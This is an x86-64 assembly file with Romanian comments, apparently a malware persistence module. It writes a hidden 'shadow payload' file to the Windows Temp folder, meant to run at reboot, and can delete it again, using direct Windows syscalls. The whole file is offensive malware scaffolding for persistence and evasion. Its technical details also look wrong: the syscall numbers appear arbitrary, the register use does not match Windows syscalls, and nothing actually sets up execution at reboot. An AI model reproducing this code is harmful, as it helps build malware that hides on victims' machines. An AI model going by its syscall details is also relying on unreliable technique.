section .text
    global shadow_persistence_enable
    global shadow_persistence_disable

; shadow_persistence_enable
; Creează un fișier shadow care va fi executat la repornirea sistemului.
shadow_persistence_enable:
    ; Configurare syscall pentru scrierea payload-ului în shadow cache
    mov rax, 0x55                    ; Syscall pentru NtCreateFile
    mov rcx, shadow_file_handle       ; Handle-ul fișierului shadow
    mov rdx, shadow_persist_path      ; Calea shadow pentru payload
    mov r8, GENERIC_WRITE
    mov r9, FILE_ATTRIBUTE_HIDDEN
    syscall                           ; Apel syscall pentru creare fișier

    ; Scrierea payload-ului în shadow cache
    mov rax, 0x56                    ; Syscall pentru NtWriteFile
    mov rcx, [shadow_file_handle]
    mov rdx, payload_data
    mov r8, payload_size
    syscall                           ; Apel syscall pentru scriere
    ret

; shadow_persistence_disable
; Șterge fișierul shadow creat pentru persistență
shadow_persistence_disable:
    mov rax, 0x57                    ; Syscall pentru NtDeleteFile
    mov rdx, shadow_persist_path     ; Calea shadow
    syscall                           ; Apel syscall pentru ștergere
    ret

section .data
    shadow_persist_path db "C:\\Windows\\Temp\\shadow_payload.dat", 0
    payload_data db "Persisted payload", 0
    payload_size equ $ - payload_data

